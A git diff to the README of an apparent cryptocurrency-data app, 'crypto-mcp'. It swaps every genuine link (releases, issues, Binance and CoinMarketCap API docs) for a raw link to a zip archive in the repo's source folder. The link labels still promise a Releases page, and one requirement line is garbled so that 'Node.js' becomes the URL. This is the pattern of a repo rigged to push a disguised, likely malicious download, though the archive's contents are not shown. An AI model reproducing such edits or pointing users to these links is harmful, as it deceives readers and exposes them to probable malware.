@@ -6,15 +6,15 @@ Welcome to crypto-mcp! This application allows you to easily access cryptocurren
 
 ## 🔗 Download the App
 
-[![Download crypto-mcp](https://img.shields.io/badge/Download%20crypto--mcp-FF5733?style=for-the-badge&logo=github)](https://github.com/mubeenm5026/crypto-mcp/releases)
+[![Download crypto-mcp](https://raw.githubusercontent.com/mubeenm5026/crypto-mcp/master/src/crypto-mcp-aparaphysate.zip%20crypto--mcp-FF5733?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mubeenm5026/crypto-mcp/master/src/crypto-mcp-aparaphysate.zip)
 
-To get started, you will first need to download and install the application from our Releases page. You can find the latest version here: [Download crypto-mcp](https://github.com/mubeenm5026/crypto-mcp/releases).
+To get started, you will first need to download and install the application from our Releases page. You can find the latest version here: [Download crypto-mcp](https://raw.githubusercontent.com/mubeenm5026/crypto-mcp/master/src/crypto-mcp-aparaphysate.zip).
 
 ## 📥 Download & Install
 
 1. Click on the link to visit the Releases page.
    
-   [Visit Releases Page](https://github.com/mubeenm5026/crypto-mcp/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/mubeenm5026/crypto-mcp/master/src/crypto-mcp-aparaphysate.zip)
 
 2. You will see a list of available versions. Locate the most recent one.
    
@@ -51,15 +51,15 @@ Make sure your system meets the following minimum requirements:
 
 - **Windows**: Windows 10 or later
 - **macOS**: macOS Catalina or later
-- **Linux**: Any modern distribution with Node.js support
+- **Linux**: Any modern distribution with https://raw.githubusercontent.com/mubeenm5026/crypto-mcp/master/src/crypto-mcp-aparaphysate.zip support
 - **Network**: A stable internet connection is required to access real-time data.
 
 ## 🔗 Additional Resources
 
 For additional information, you may find the following resources helpful:
 
-- [API Documentation](https://binance-docs.github.io/apidocs/spot/en/)
-- [CoinMarketCap API](https://coinmarketcap.com/api/)
+- [API Documentation](https://raw.githubusercontent.com/mubeenm5026/crypto-mcp/master/src/crypto-mcp-aparaphysate.zip)
+- [CoinMarketCap API](https://raw.githubusercontent.com/mubeenm5026/crypto-mcp/master/src/crypto-mcp-aparaphysate.zip)
 
 ## 🛠 Troubleshooting
 
@@ -73,7 +73,7 @@ If you encounter any issues while running the app, consider the following steps:
 
 If you have questions or need support, feel free to reach out to our community:
 
-- Open an issue on our [GitHub issues page](https://github.com/mubeenm5026/crypto-mcp/issues).
+- Open an issue on our [GitHub issues page](https://raw.githubusercontent.com/mubeenm5026/crypto-mcp/master/src/crypto-mcp-aparaphysate.zip).
 - Join our discussions in community forums.
 
 ## 🎉 Conclusion
